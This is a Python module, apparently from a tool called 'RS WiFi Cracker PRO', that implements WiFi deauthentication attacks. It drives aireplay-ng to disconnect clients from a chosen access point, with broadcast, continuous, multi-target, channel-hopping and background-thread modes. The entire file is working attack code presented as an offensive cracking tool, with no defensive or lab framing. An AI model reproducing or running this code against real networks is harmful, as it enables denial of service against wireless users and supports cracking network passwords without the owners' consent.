#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO - Deauthentication Attack Module"""
import time
import subprocess
import threading
from typing import Optional, List
from datetime import datetime


class DeauthAttack:
    """Deauthentication attack module"""
    
    def __init__(self, interface: str, logger, db=None):
        self.interface = interface
        self.logger = logger
        self.db = db
        self.running = False
        self.packets_sent = 0
    
    def deauth_target(self, bssid: str, client: str = None, 
                      count: int = 10) -> bool:
        """Send deauth to specific target"""
        self.logger.info(f"Deauthenticating {client or 'all clients'} from {bssid}")
        
        cmd = ['aireplay-ng', '-0', str(count), '-a', bssid]
        if client:
            cmd.extend(['-c', client])
        cmd.append(self.interface)
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                self.packets_sent += count
                self.logger.success(f"Sent {count} deauth packets")
                return True
            else:
                self.logger.error(f"Deauth failed: {result.stderr}")
                
        except Exception as e:
            self.logger.error(f"Deauth error: {e}")
        
        return False
    
    def deauth_broadcast(self, bssid: str, count: int = 10) -> bool:
        """Broadcast deauth to all clients"""
        return self.deauth_target(bssid, None, count)
    
    def deauth_continuous(self, bssid: str, client: str = None,
                          duration: int = 60, interval: float = 2.0):
        """Continuous deauth attack"""
        self.running = True
        self.packets_sent = 0
        start_time = time.time()
        
        self.logger.info(f"Starting continuous deauth for {duration}s...")
        
        while self.running and (time.time() - start_time) < duration:
            self.deauth_target(bssid, client, 5)
            time.sleep(interval)
        
        self.logger.info(f"Stopped. Total packets sent: {self.packets_sent}")
    
    def deauth_multiple(self, targets: List[dict], count: int = 5):
        """Deauth multiple targets"""
        for target in targets:
            bssid = target.get('bssid')
            client = target.get('client')
            
            self.deauth_target(bssid, client, count)
            time.sleep(1)
    
    def deauth_channel_hopping(self, bssid: str, channels: List[int],
                                duration: int = 120):
        """Deauth with channel hopping"""
        self.running = True
        start_time = time.time()
        channel_idx = 0
        
        self.logger.info("Starting channel-hopping deauth...")
        
        while self.running and (time.time() - start_time) < duration:
            channel = channels[channel_idx % len(channels)]
            
            # Set channel
            subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(channel)],
                          capture_output=True)
            
            # Deauth
            self.deauth_target(bssid, None, 3)
            
            channel_idx += 1
            time.sleep(2)
        
        self.logger.info("Channel-hopping deauth completed")
    
    def start_background(self, bssid: str, client: str = None,
                         interval: float = 3.0) -> threading.Thread:
        """Start background deauth thread"""
        self.running = True
        
        def deauth_loop():
            while self.running:
                self.deauth_target(bssid, client, 3)
                time.sleep(interval)
        
        thread = threading.Thread(target=deauth_loop, daemon=True)
        thread.start()
        self.logger.info("Background deauth started")
        
        return thread
    
    def stop(self):
        """Stop deauth attack"""
        self.running = False
        self.logger.info(f"Deauth stopped. Total packets: {self.packets_sent}")
